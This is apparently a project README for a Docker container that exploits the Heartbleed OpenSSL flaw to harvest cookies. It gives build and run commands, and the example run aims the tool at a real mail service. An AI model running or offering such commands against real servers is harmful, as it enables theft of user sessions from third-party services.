# heartbleed-docker

A docker container to exploit heartbleed OpenSSL, and save the cookies

### Build & Run
```
docker build -t arthurnn/heartbleed .

docker run -d -p 9099:9099 arthurnn/heartbleed mail.yahoo.com
```
